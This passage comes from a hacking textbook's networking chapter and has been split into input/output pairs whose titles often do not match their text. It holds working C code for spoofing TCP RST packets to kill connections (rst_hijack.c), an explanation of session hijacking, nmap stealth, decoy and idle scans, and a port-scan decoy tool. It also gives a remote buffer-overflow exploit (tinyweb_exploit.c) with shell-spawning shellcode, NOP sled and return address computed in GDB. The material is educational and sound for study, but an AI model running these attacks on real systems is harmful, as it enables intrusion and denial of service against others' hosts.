filter_string[100];\nsprintf(filter_string, \"tcp[tcpflags] & tcp-ack != 0 and dst host %s\", inet_ntoa(*target_ip));\nprintf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\nif(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\nfatal(\"pcap_compile failed\");\nif(pcap_setfilter(pcap_hdl, &filter) == -1)\nfatal(\"pcap_setfilter failed\");\n}\nThe next function compiles and sets the BPF to only accept packets from\nestablished connections to the target IP. The sprintf() function is just a printf()\nthat prints to a string.\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\n*packet) {\nu_char *pkt_data;\nstruct libnet_ip_hdr *IPhdr;\nstruct libnet_tcp_hdr *TCPhdr;\nstruct data_pass *passed;\nint bcount;\npassed = (struct data_pass *) user_args; // Pass data using a pointer to a struct.\nIPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\nTCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\nprintf(\"resetting TCP connection from %s:%d \",\ninet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));\nprintf(\"<---> %s:%d\\n\",\ninet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));\nlibnet_build_ip(LIBNET_TCP_H, // Size of the packet sans IP header\nIPTOS_LOWDELAY, // IP tos\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\n0, // Frag stuff\nlibnet_get_prand(LIBNET_PR8), // TTL (randomized)\nIPPROTO_TCP, // Transport protocol\n*((u_long *)&(IPhdr->ip_dst)), // Source IP (pretend we are dst)\n*((u_long *)&(IPhdr->ip_src)), // Destination IP (send back to src)\nNULL, // Payload (none)\n0, // Payload length\npassed->packet); // Packet header memory\nlibnet_build_tcp(htons(TCPhdr->th_dport), // Source TCP port (pretend we are dst)\nhtons(TCPhdr->th_sport), // Destination TCP port (send back to src)\nhtonl(TCPhdr->th_ack), // Sequence number (use previous ack)\nlibnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\n262 0x400"
  },
  {
    "input": "0x462 Continued Hijacking",
    "output": "TH_RST, // Control flags (RST flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n0, // Urgent pointer\nNULL, // Payload (none)\n0, // Payload length\n(passed->packet) + LIBNET_IP_H);// Packet header memory\nif (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);\nif (bcount < LIBNET_IP_H + LIBNET_TCP_H)\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\nusleep(5000); // pause slightly\n}\nThe callback function spoofs the RST packets. First, the critical libnet data\nis retrieved, and pointers to the IP and TCP headers are set using the structures\nincluded with libnet. We could use our own structures from hacking-network.h,\nbut the libnet structures are already there and compensate for the host’s\nbyte ordering. The spoofed RST packet uses the sniffed source address as\nthe destination, and vice versa. The sniffed sequence number is used as the\nspoofed packet’s acknowledgment number, since that is what is expected.\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o rst_hijack rst_hijack.c -lnet -lpcap\nreader@hacking:~/booksrc $ sudo ./rst_hijack 192.168.42.88\nDEBUG: filter string is 'tcp[tcpflags] & tcp-ack != 0 and dst host 192.168.42.88'\nResetting all TCP connections to 192.168.42.88 on eth0\nresetting TCP connection from 192.168.42.72:47783 <---> 192.168.42.88:22\n0x462 Continued Hijacking\nThe spoofed packet doesn’t need to be an RST packet. This attack becomes\nmore interesting when the spoof packet contains data. The host machine\nreceives the spoofed packet, increments the sequence number, and responds\nto the victim’s IP. Since the victim’s machine doesn’t know about the spoofed\npacket, the host machine’s response has an incorrect sequence number, so\nthe victim ignores that response packet. And since the victim’s machine\nignored the host machine’s response packet, the victim’s sequence number\ncount is off. Therefore, any packet the victim tries to send to the host machine\nwill have an incorrect sequence number as well, causing the host machine\ntoignore it. In this case, both legitimate sides of the connection have\nincorrect sequence numbers, resulting in a desynchronized state. And since\nthe attacker sent out the first spoofed packet that caused all this chaos, it can\nkeep track of sequence numbers and continue spoofing packets from the\nvictim’s IP address to the host machine. This lets the attacker continue com-\nmunicating with the host machine while the victim’s connection hangs.\nNetworking 263"
  },
  {
    "input": "0x472 FIN, X-mas, and Null Scans",
    "output": "0x470 Port Scanning\nPort scanning is a way of figuring out which ports are listening and accepting\nconnections. Since most services run on standard, documented ports, this\ninformation can be used to determine which services are running. The simpl-\nest form of port scanning involves trying to open TCP connections to every\npossible port on the target system. While this is effective, it’s also noisy and\ndetectable. Also, when connections are established, services will normally log\nthe IP address. To avoid this, several clever techniques have been invented.\nA port scanning tool called nmap, written by Fyodor, implements all of\nthe following port-scanning techniques. This tool has become one of the most\npopular open source port-scanning tools.\n0x471 Stealth SYN Scan\nA SYN scan is also sometimes called a half-open scan. This is because it doesn’t\nactually open a full TCP connection. Recall the TCP/IP handshake: When a\nfull connection is made, first a SYN packet is sent, then a SYN/ACK packet is\nsent back, and finally an ACK packet is returned to complete the handshake\nand open the connection. A SYN scan doesn’t complete the handshake, so a\nfull connection is never opened. Instead, only the initial SYN packet is sent,\nand the response is examined. If a SYN/ACK packet is received in response,\nthat port must be accepting connections. This is recorded, and an RST packet\nis sent to tear down the connection to prevent the service from accidentally\nbeing DoSed.\nUsing nmap, a SYN scan can be performed using the command-line\noption -sS. The program must be run as root, since the program isn’t using\nstandard sockets and needs raw network access.\nreader@hacking:~/booksrc $ sudo nmap -sS 192.168.42.72\nStarting Nmap 4.20 ( http://insecure.org ) at 2007-05-29 09:19 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1696 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\nNmap finished: 1 IP address (1 host up) scanned in 0.094 seconds\n0x472 FIN, X-mas, and Null Scans\nIn response to SYN scanning, new tools to detect and log half-open connections\nwere created. So yet another collection of techniques for stealth port scanning\nevolved: FIN, X-mas, and Null scans. These all involve sending a nonsensical\npacket to every port on the target system. If a port is listening, these packets\njust get ignored. However, if the port is closed and the implementation follows\nprotocol (RFC 793), an RST packet will be sent. This difference can be used\nto detect which ports are accepting connections, without actually opening\nany connections.\nThe FIN scan sends a FIN packet, the X-mas scan sends a packet with\nFIN, URG, and PUSH turned on (so named because the flags are lit up like a\n264 0x400"
  },
  {
    "input": "0x474 Idle Scanning",
    "output": "Christmas tree), and the Null scan sends a packet with no TCP flags set. While\nthese types of scans are stealthier, they can also be unreliable. For instance,\nMicrosoft’s implementation of TCP doesn’t send RST packets like it should,\nmaking this form of scanning ineffective.\nUsing nmap, FIN, X-mas, and NULL scans can be performed using the\ncommand-line options -sF, -sX, and -sN, respectively. Their output looks\nbasically the same as the previous scan.\n0x473 Spoofing Decoys\nAnother way to avoid detection is to hide among several decoys. This technique\nsimply spoofs connections from various decoy IP addresses in between each\nreal port-scanning connection. The responses from the spoofed connections\naren’t needed, since they are simply misleads. However, the spoofed decoy\naddresses must use real IP addresses of live hosts; otherwise, the target may\nbe accidentally SYN flooded.\nDecoys can be specified in nmap with the -D command-line option.\nThe sample nmap command shown below scans the IP 192.168.42.72, using\n192.168.42.10 and 192.168.42.11 as decoys.\nreader@hacking:~/booksrc $ sudo nmap -D 192.168.42.10,192.168.42.11 192.168.42.72\n0x474 Idle Scanning\nIdle scanning is a way to scan a target using spoofed packets from an idle\nhost, by observing changes in the idle host. The attacker needs to find a\nusable idle host that is not sending or receiving any other network traffic and\nthat has a TCP implementation that produces predictable IP IDs that change\nby a known increment with each packet. IP IDs are meant to be unique per\npacket per session, and they are commonly incremented by a fixed amount.\nPredictable IP IDs have never really been considered a security risk, and idle\nscanning takes advantage of this misconception. Newer operating systems,\nsuch as the recent Linux kernel, OpenBSD, and Windows Vista, randomize\nthe IP ID, but older operating systems and hardware (such as printers)\ntypically do not.\nFirst, the attacker gets the current IP ID of the idle host by contacting it\nwith a SYN packet or an unsolicited SYN/ACK packet and observing the IP\nID of the response. By repeating this process a few more times, the incre-\nment applied to the IP ID with each packet can be determined.\nThen, the attacker sends a spoofed SYN packet with the idle host’s IP\naddress to a port on the target machine. One of two things will happen,\ndepending on whether that port on the victim machine is listening:\n(cid:0) If that port is listening, a SYN/ACK packet will be sent back to the idle\nhost. But since the idle host didn’t actually send out the initial SYN\npacket, this response appears to be unsolicited to the idle host, and it\nresponds by sending back an RST packet.\n(cid:0) If that port isn’t listening, the target machine doesn’t send a SYN/ACK\npacket back to the idle host, so the idle host doesn’t respond.\nNetworking 265\nAt this point, the attacker contacts the idle host again to determine how\nmuch the IP ID has incremented. If it has only incremented by one interval,\nno other packets were sent out by the idle host between the two checks. This\nimplies that the port on the target machine is closed. If the IP ID has incre-\nmented by two intervals, one packet, presumably an RST packet, was sent out\nby the idle machine between the checks. This implies that the port on the\ntarget machine is open.\nThe steps are illustrated on the next page for both possible outcomes.\nOf course, if the idle host isn’t truly idle, the results will be skewed. If\nthere is light traffic on the idle host, multiple packets can be sent for each\nport. If 20 packets are sent, then a change of 20 incremental steps should be\nan indication of an open port, and none, of a closed port. Even if there is\nlight traffic, such as one or two non–scan-related packets sent by the idle\nhost, this difference is large enough that it can still be detected.\nIf this technique is used properly on an idle host that doesn’t have any\nlogging capabilities, the attacker can scan any target without ever revealing\nhis or her IP address.\nAfter finding a suitable idle host, this type of scanning can be done with\nnmap using the -sI command-line option followed by the idle host’s address:\nreader@hacking:~/booksrc $ sudo nmap -sI idlehost.com 192.168.42.7\nPort open on target Last ID from\n3\nidle host = 50\nSYN/ACK\nIdle host RST (ID = 52) Attacker\n2 1\nSYN/ACK RST (ID = 51)\nSYN\nSpoofed with idle host\nas the source address\nTarget\nPort closed on target 2 Last ID from\nidle host = 50\nSYN/ACK\nIdle host RST (ID = 51) Attacker\n1\nSYN\nSpoofed with idle host\nas the source address\nTarget\n266 0x400"
  },
  {
    "input": "0x475 Proactive Defense (shroud)",
    "output": "0x475 Proactive Defense (shroud)\nPort scans are often used to profile systems before they are attacked. Know-\ning what ports are open allows an attacker to determine which services can\nbe attacked. Many IDSs offer methods to detect port scans, but by then the\ninformation has already been leaked. While writing this chapter, I wondered\nif it is possible to prevent port scans before they actually happen. Hacking,\nreally, is all about coming up with new ideas, so a newly developed method\nfor proactive port-scanning defense will be presented here.\nFirst of all, the FIN, Null, and X-mas scans can be prevented by a simple\nkernel modification. If the kernel never sends reset packets, these scans will\nturn up nothing. The following output uses grep to find the kernel code\nresponsible for sending reset packets.\nreader@hacking:~/booksrc $ grep -n -A 20 \"void.*send_reset\" /usr/src/linux/net/ipv4/tcp_ipv4.c\n547:static void tcp_v4_send_reset(struct sock *sk, struct sk_buff *skb)\n548-{\n549- struct tcphdr *th = skb->h.th;\n550- struct {\n551- struct tcphdr th;\n552-#ifdef CONFIG_TCP_MD5SIG\n553- __be32 opt[(TCPOLEN_MD5SIG_ALIGNED >> 2)];\n554-#endif\n555- } rep;\n556- struct ip_reply_arg arg;\n557-#ifdef CONFIG_TCP_MD5SIG\n558- struct tcp_md5sig_key *key;\n559-#endif\n560-\nreturn; // Modification: Never send RST, always return.\n561- /* Never send a reset in response to a reset. */\n562- if (th->rst)\n563- return;\n564-\n565- if (((struct rtable *)skb->dst)->rt_type != RTN_LOCAL)\n566- return;\n567-\nreader@hacking:~/booksrc $\nBy adding the return command (shown above in bold), the\ntcp_v4_send_reset() kernel function will simply return instead of doing\nanything. After the kernel is recompiled, the resulting kernel won’t send\noutreset packets, avoiding information leakage.\nFIN Scan Before the Kernel Modification\nmatrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1678 closed ports\nNetworking 267\nPORT STATE SERVICE\n22/tcp open|filtered ssh\n80/tcp open|filtered http\nMAC Address: 00:01:6C:EB:1D:50 (Foxconn)\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nmatrix@euclid:~ $\nFIN Scan After the Kernel Modification\nmatrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1678 closed ports\nPORT STATE SERVICE\nMAC Address: 00:01:6C:EB:1D:50 (Foxconn)\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nmatrix@euclid:~ $\nThis works fine for scans that rely on RST packets, but preventing infor-\nmation leakage with SYN scans and full-connect scans is a bit more difficult.\nIn order to maintain functionality, open ports have to respond with SYN/ACK\npackets—there is no way around that. But if all of the closed ports also\nresponded with SYN/ACK packets, the amount of useful information an\nattacker could retrieve from port scans would be minimized. Simply opening\nevery port would cause a major performance hit, though, which isn’t desirable.\nIdeally, this should all be done without using a TCP stack. The following pro-\ngram does exactly that. It’s a modification of the rst_hijack.c program, using\na more complex BPF string to filter only SYN packets destined for closed ports.\nThe callback function spoofs a legitimate looking SYN/ACK response to any\nSYN packet that makes it through the BPF. This will flood port scanners with\na sea of false positives, which will hide legitimate ports.\nshroud.c\n#include <libnet.h>\n#include <pcap.h>\n#include \"hacking.h\"\n#define MAX_EXISTING_PORTS 30\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint set_packet_filter(pcap_t *, struct in_addr *, u_short *);\nstruct data_pass {\nint libnet_handle;\nu_char *packet;\n};\nint main(int argc, char *argv[]) {\nstruct pcap_pkthdr cap_header;\nconst u_char *packet, *pkt_data;\npcap_t *pcap_handle;\n268 0x400\nchar errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\nchar *device;\nu_long target_ip;\nint network, i;\nstruct data_pass critical_libnet_data;\nu_short existing_ports[MAX_EXISTING_PORTS];\nif((argc < 2) || (argc > MAX_EXISTING_PORTS+2)) {\nif(argc > 2)\nprintf(\"Limited to tracking %d existing ports.\\n\", MAX_EXISTING_PORTS);\nelse\nprintf(\"Usage: %s <IP to shroud> [existing ports...]\\n\", argv[0]);\nexit(0);\n}\ntarget_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\nif (target_ip == -1)\nfatal(\"Invalid target address\");\nfor(i=2; i < argc; i++)\nexisting_ports[i-2] = (u_short) atoi(argv[i]);\nexisting_ports[argc-2] = 0;\ndevice = pcap_lookupdev(errbuf);\nif(device == NULL)\nfatal(errbuf);\npcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\nif(pcap_handle == NULL)\nfatal(errbuf);\ncritical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\nif(critical_libnet_data.libnet_handle == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface. -- this program must run\nas root.\\n\");\nlibnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\nif (critical_libnet_data.packet == NULL)\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nlibnet_seed_prand();\nset_packet_filter(pcap_handle, (struct in_addr *)&target_ip, existing_ports);\npcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\npcap_close(pcap_handle);\n}\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip, u_short *ports) {\nstruct bpf_program filter;\nchar *str_ptr, filter_string[90 + (25 * MAX_EXISTING_PORTS)];\nint i=0;\nsprintf(filter_string, \"dst host %s and \", inet_ntoa(*target_ip)); // Target IP\nNetworking 269\nstrcat(filter_string, \"tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0\");\nif(ports[0] != 0) { // If there is at least one existing port\nstr_ptr = filter_string + strlen(filter_string);\nif(ports[1] == 0) // There is only one existing port\nsprintf(str_ptr, \" and not dst port %hu\", ports[i]);\nelse { // Two or more existing ports\nsprintf(str_ptr, \" and not (dst port %hu\", ports[i++]);\nwhile(ports[i] != 0) {\nstr_ptr = filter_string + strlen(filter_string);\nsprintf(str_ptr, \" or dst port %hu\", ports[i++]);\n}\nstrcat(filter_string, \")\");\n}\n}\nprintf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\nif(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\nfatal(\"pcap_compile failed\");\nif(pcap_setfilter(pcap_hdl, &filter) == -1)\nfatal(\"pcap_setfilter failed\");\n}\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\n*packet) {\nu_char *pkt_data;\nstruct libnet_ip_hdr *IPhdr;\nstruct libnet_tcp_hdr *TCPhdr;\nstruct data_pass *passed;\nint bcount;\npassed = (struct data_pass *) user_args; // Pass data using a pointer to a struct\nIPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\nTCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\nlibnet_build_ip(LIBNET_TCP_H, // Size of the packet sans IP header\nIPTOS_LOWDELAY, // IP tos\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\n0, // Frag stuff\nlibnet_get_prand(LIBNET_PR8), // TTL (randomized)\nIPPROTO_TCP, // Transport protocol\n*((u_long *)&(IPhdr->ip_dst)), // Source IP (pretend we are dst)\n*((u_long *)&(IPhdr->ip_src)), // Destination IP (send back to src)\nNULL, // Payload (none)\n0, // Payload length\npassed->packet); // Packet header memory\nlibnet_build_tcp(htons(TCPhdr->th_dport),// Source TCP port (pretend we are dst)\nhtons(TCPhdr->th_sport), // Destination TCP port (send back to src)\nhtonl(TCPhdr->th_ack), // Sequence number (use previous ack)\nhtonl((TCPhdr->th_seq) + 1), // Acknowledgement number (SYN's seq # + 1)\nTH_SYN | TH_ACK, // Control flags (RST flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n0, // Urgent pointer\n270 0x400\nNULL, // Payload (none)\n0, // Payload length\n(passed->packet) + LIBNET_IP_H);// Packet header memory\nif (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);\nif (bcount < LIBNET_IP_H + LIBNET_TCP_H)\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\nprintf(\"bing!\\n\");\n}\nThere are a few tricky parts in the code above, but you should be able to\nfollow all of it. When the program is compiled and executed, it will shroud the\nIP address given as the first argument, with the exception of a list of existing\nports provided as the remaining arguments.\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o shroud shroud.c -lnet -lpcap\nreader@hacking:~/booksrc $ sudo ./shroud 192.168.42.72 22 80\nDEBUG: filter string is 'dst host 192.168.42.72 and tcp[tcpflags] & tcp-syn != 0 and\ntcp[tcpflags] & tcp-ack = 0 and not (dst port 22 or dst port 80)'\nWhile shroud is running, any port scanning attempts will show every port\nto be open.\nmatrix@euclid:~ $ sudo nmap -sS 192.168.0.189\nStarting nmap V. 3.00 ( www.insecure.org/nmap/ )\nInteresting ports on (192.168.0.189):\nPort State Service\n1/tcp open tcpmux\n2/tcp open compressnet\n3/tcp open compressnet\n4/tcp open unknown\n5/tcp open rje\n6/tcp open unknown\n7/tcp open echo\n8/tcp open unknown\n9/tcp open discard\n10/tcp open unknown\n11/tcp open systat\n12/tcp open unknown\n13/tcp open daytime\n14/tcp open unknown\n15/tcp open netstat\n16/tcp open unknown\n17/tcp open qotd\n18/tcp open msp\n19/tcp open chargen\n20/tcp open ftp-data\n21/tcp open ftp\n22/tcp open ssh\nNetworking 271"
  },
  {
    "input": "0x480 Reach Out and Hack Someone",
    "output": "23/tcp open telnet\n24/tcp open priv-mail\n25/tcp open smtp\n[ output trimmed ]\n32780/tcp open sometimes-rpc23\n32786/tcp open sometimes-rpc25\n32787/tcp open sometimes-rpc27\n43188/tcp open reachout\n44442/tcp open coldfusion-auth\n44443/tcp open coldfusion-auth\n47557/tcp open dbbrowse\n49400/tcp open compaqdiag\n54320/tcp open bo2k\n61439/tcp open netprowler-manager\n61440/tcp open netprowler-manager2\n61441/tcp open netprowler-sensor\n65301/tcp open pcanywhere\nNmap run completed -- 1 IP address (1 host up) scanned in 37 seconds\nmatrix@euclid:~ $\nThe only service that is actually running is ssh on port 22, but it is hidden\nin a sea of false positives. A dedicated attacker could simply telnet to every\nport to check the banners, but this technique could easily be expanded to\nspoof banners also.\n0x480 Reach Out and Hack Someone\nNetwork programming tends to move many chunks of memory around and is\nheavy in typecasting. You’ve seen for yourself how crazy some of the typecasts\ncan get. Mistakes thrive in this type of chaos. And since many network pro-\ngrams need to run as root, these little mistakes can become critical vulner-\nabilities. One such vulnerability exists in the code from this chapter. Did you\nnotice it?\nFrom hacking-network.h\n/* This function accepts a socket FD and a ptr to a destination\n* buffer. It will receive from the socket until the EOL byte\n* sequence in seen. The EOL bytes are read from the socket, but\n* the destination buffer is terminated before these bytes.\n* Returns the size of the read line (without EOL bytes).\n*/\nint recv_line(int sockfd, unsigned char *dest_buffer) {\n#define EOL \"\\r\\n\" // End-of-line byte sequence\n#define EOL_SIZE 2\nunsigned char *ptr;\nint eol_matched = 0;\nptr = dest_buffer;\n272 0x400"
  },
  {
    "input": "0x481 Analysis with GDB",
    "output": "while(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\nif(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\neol_matched++;\nif(eol_matched == EOL_SIZE) { // If all bytes match terminator,\n*(ptr+1-EOL_SIZE) = '\\0'; // terminate the string.\nreturn strlen(dest_buffer); // Return bytes recevied.\n}\n} else {\neol_matched = 0;\n}\nptr++; // Increment the pointer to the next byte.\n}\nreturn 0; // Didn't find the end-of-line characters.\n}\nThe recv_line() function in hacking-network.h has a small mistake of\nomission—there is no code to limit the length. This means received bytes\ncan overflow if they exceed the dest_buffer size. The tinyweb server program\nand any other programs that use this function are vulnerable to attack.\n0x481 Analysis with GDB\nTo exploit the vulnerability in the tinyweb.c program, we just need to send\npackets that will strategically overwrite the return address. First, we need to\nknow the offset from the start of a buffer we control to the stored return\naddress. Using GDB, we can analyze the compiled program to find this;\nhowever, there are some subtle details that can cause tricky problems. For\nexample, the program requires root privileges, so the debugger must be run\nas root. But using sudo or running with root’s environment will change the\nstack, meaning the addresses seen in the debugger’s run of the binary won’t\nmatch the addresses when it’s running normally. There are other slight\ndifferences that can shift memory around in the debugger like this, creating\ninconsistencies that can be maddening to track down. According to the\ndebugger, everything will look like it should work; however, the exploit fails\nwhen run outside the debugger, since the addresses are different.\nOne elegant solution to this problem is to attach to the process after it’s\nalready running. In the output below, GDB is used to attach to an already-\nrunning tinyweb process that was started in another terminal. The source is\nrecompiled using the -g option to include debugging symbols that GDB\ncan apply to the running process.\nreader@hacking:~/booksrc $ ps aux | grep tinyweb\nroot 13019 0.0 0.0 1504 344 pts/0 S+ 20:25 0:00 ./tinyweb\nreader 13104 0.0 0.0 2880 748 pts/2 R+ 20:27 0:00 grep tinyweb\nreader@hacking:~/booksrc $ gcc -g tinyweb.c\nreader@hacking:~/booksrc $ sudo gdb -q --pid=13019 --symbols=./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 13019\n/cow/home/reader/booksrc/tinyweb: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\nNetworking 273\n(gdb) bt\n#0 0xb7fe77f2 in ?? ()\n#1 0xb7f691e1 in ?? ()\n#2 0x08048ccf in main () at tinyweb.c:44\n(gdb) list 44\n39 if (listen(sockfd, 20) == -1)\n40 fatal(\"listening on socket\");\n41\n42 while(1) { // Accept loop\n43 sin_size = sizeof(struct sockaddr_in);\n44 new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n45 if(new_sockfd == -1)\n46 fatal(\"accepting connection\");\n47\n48 handle_connection(new_sockfd, &client_addr);\n(gdb) list handle_connection\n53 /* This function handles the connection on the passed socket from the\n54 * passed client address. The connection is processed as a web request\n55 * and this function replies over the connected socket. Finally, the\n56 * passed socket is closed at the end of the function.\n57 */\n58 void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\n59 unsigned char *ptr, request[500], resource[500];\n60 int fd, length;\n61 (cid:0)\n62 length = recv_line(sockfd, request);\n(gdb) break 62\nBreakpoint 1 at 0x8048d02: file tinyweb.c, line 62.\n(gdb) cont\nContinuing.\nAfter attaching to the running process, a stack backtrace shows the pro-\ngram is currenty in main(), waiting for (cid:0)a connection. After setting a breakpoint\nat the first recv_line() call on line 62 ( ), the program is allowed to continue.\nAt this point, the program’s execution must be advanced by making a web\nrequest using wget in another terminal or a browser. Then the breakpoint in\nhandle_connection() will be hit.\nBreakpoint 2, handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n62 length = recv_line(sockfd, request);\n(gdb) x/x request\n0xbffff5c0: 0x00000000\n(gdb) bt\n#0 handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n#1 0x08048cf6 in main () at tinyweb.c:48\n(gdb) x/16xw request+500\n0xbffff7b4: 0xb7fd5ff4 0xb8000ce0 0x00000000 0xbffff848\n0xbffff7c4: 0xb7ff9300 0xb7fd5ff4 0xbffff7e0 0xb7f691c0\n0xbffff7d4: 0xb7fd5ff4 0xbffff848 0x08048cf6 0x00000004\n0xbffff7e4: 0xbffff810 0xbffff80c 0xbffff834 0x00000004\n((cid:0)gdb) x/x 0xbffff7d4+8\n0xbffff7dc: 0x08048cf6\n(gdb) p 0xbffff7dc - 0xbffff5c0\n274 0x400"
  },
  {
    "input": "0x482 Almost Only Counts with Hand Grenades",
    "output": "$1 = 540\n(gdb) p /x 0xbffff5c0 + 200\n$2 = 0xbffff688\n(gdb) quit\nThe program is running. Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 13019\nreader@hacking:~/booksrc $\nAt the breakpoint, the request buffer begins at 0xbfffff5c0. The bt com-\nmand’s stack backtrace shows that the return address from handle_connection()\nis 0x08048cf6. Since we know how the local variables are generally laid out on\nthe stack, we know the request buffer is near the end of the frame. This means\nthat the stored return address should be on the stack somewhere near the\nend of this 500-byte buffer. Since we already know the general are(cid:0)a to look, a\nquick inspection shows the stored return address is at 0xbffff7dc ( ). A little\nmath shows the stored return address is 540 bytes from the start of the request\nbuffer. However, there are a few bytes near the beginning of the buffer that\nmight be mangled by the rest of the function. Remember, we don’t gain\ncontrol of the program until the function returns. To account for this, it’s\nbest to just avoid the beginning of the buffer. Skipping the first 200 bytes\nshould be safe, while leaving plenty of space for shellcode in the remaining\n300 bytes. This means 0xbffff688 is the target return address.\n0x482 Almost Only Counts with Hand Grenades\nThe following exploit for the tinyweb program uses the offset and return\naddress overwrite values calculated with GDB. It fills the exploit buffer with\nnull bytes, so anything written into it will automatically be null-terminated.\nThen it fills the first 540 bytes with NOP instructions. This builds the NOP\nsled and fills the buffer up to the return address overwrite location. Then\ntheentire string is terminated with the '\\r\\n' line terminator.\ntinyweb_exploit.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\"; // Standard shellcode\n#define OFFSET 540\nNetworking 275\n#define RETADDR 0xbffff688\nint main(int argc, char *argv[]) {\nint sockfd, buflen;\nstruct hostent *host_info;\nstruct sockaddr_in target_addr;\nunsigned char buffer[600];\nif(argc < 2) {\nprintf(\"Usage: %s <hostname>\\n\", argv[0]);\nexit(1);\n}\nif((host_info = gethostbyname(argv[1])) == NULL)\nfatal(\"looking up hostname\");\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nfatal(\"in socket\");\ntarget_addr.sin_family = AF_INET;\ntarget_addr.sin_port = htons(80);\ntarget_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\nmemset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\nfatal(\"connecting to target server\");\nbzero(buffer, 600); // Zero out the buffer.\nmemset(buffer, '\\x90', OFFSET); // Build a NOP sled.\n*((u_int *)(buffer + OFFSET)) = RETADDR; // Put the return address in\nmemcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode.\nstrcat(buffer, \"\\r\\n\"); // Terminate the string.\nprintf(\"Exploit buffer:\\n\");\ndump(buffer, strlen(buffer)); // Show the exploit buffer.\nsend_string(sockfd, buffer); // Send exploit buffer as an HTTP request.\nexit(0);\n}\nWhen this program is compiled, it can remotely exploit hosts running\nthe tinyweb program, tricking them into running the shellcode. The exploit\nalso dumps out the bytes of the exploit buffer before it sends it. In the output\nbelow, the tinyweb program is run in a different terminal, and the exploit is\ntested against it. Here’s the output from the attacker’s terminal:\nreader@hacking:~/booksrc $ gcc tinyweb_exploit.c\nreader@hacking:~/booksrc $ ./a.out 127.0.0.1\nExploit buffer:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 